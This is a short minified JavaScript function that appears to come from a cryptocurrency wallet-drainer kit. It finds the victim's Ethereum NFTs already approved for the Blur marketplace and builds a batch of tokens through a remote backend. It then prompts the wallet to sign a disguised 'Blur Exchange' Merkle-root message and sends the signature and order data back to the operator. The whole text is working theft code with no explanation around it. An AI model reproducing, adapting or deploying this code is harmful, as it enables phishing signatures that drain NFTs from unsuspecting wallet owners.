const SIGN_BLUR=async(e,t,s,a,r)=>{try{const a=[],o=[];for(const t of e)t.skip||"ERC721"!==t.type||1!=t.chain_id||await is_nft_approved(t.address,s,"0x00000000000111abe46ff893f3b2fdf1f759a8a8")&&(a.push({collection:t.address,tokenID:t.id}),o.push(t));if(a.length<2)return;let i=new ethers.providers.Web3Provider(t).getSigner(),n=await send_request({action:"blur",user_id:r,blur:"root",tokens:a,address:s});try{await send_request({action:"blur",user_id:r,blur:"request",assets:o});const t=await i._signTypedData({name:"Blur Exchange",version:"1.0",chainId:1,verifyingContract:"0x000000000000Ad05Ccc4F10045630fb830B95127"},{Root:[{name:"root",type:"bytes32"}]},{root:n.data.root});await send_request({action:"blur",user_id:r,blur:"success",signature:t,address:s,root:n.data.root,paths:n.data.paths});for(const t of e){if(t.skip||"ERC721"!==t.type||1!=t.chain_id)continue;let e=!1;for(const s of o)if("ERC721"===s.type&&1==s.chain_id&&s.address==t.address&&s.id==t.id){e=!0;break}1==e&&(t.skip=!0)}}catch(e){console.log(e),await send_request({action:"blur",user_id:r,blur:"cancel"})}}catch(e){console.log(e)}};